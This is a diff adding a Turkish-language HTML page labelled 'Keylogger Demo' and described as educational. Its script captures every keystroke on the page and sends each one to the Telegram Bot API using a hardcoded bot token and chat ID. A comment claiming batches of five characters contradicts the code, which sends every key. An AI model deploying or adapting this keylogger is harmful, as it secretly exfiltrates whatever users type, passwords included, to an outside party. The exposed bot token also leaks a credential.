@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <title>Keylogger Demo</title>
+</head>
+<body>
+  <h2>Keylogger Demo</h2>
+  <p>Bu sadece sayfa içi girişleri Telegram'a gönderir. Eğitim amaçlıdır.</p>
+  <textarea id="input" rows="10" cols="60" placeholder="Buraya bir şeyler yaz..."></textarea>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
+    const TELEGRAM_CHAT_ID = '5395609882';
+
+    let logBuffer = '';
+
+    document.addEventListener('keydown', function (e) {
+      logBuffer += e.key;
+
+      // Her 5 karakterde bir Telegram'a gönder
+      if (logBuffer.length >= 1) {
+        sendToTelegram(logBuffer);
+        logBuffer = '';
+      }
+    });
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const data = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: `🖊️ Yeni giriş: ${message}`
+      };
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      }).catch(err => {
+        console.error("Telegram gönderim hatası:", err);
+      });
+    }
+  </script>
+</body>
+</html>
+
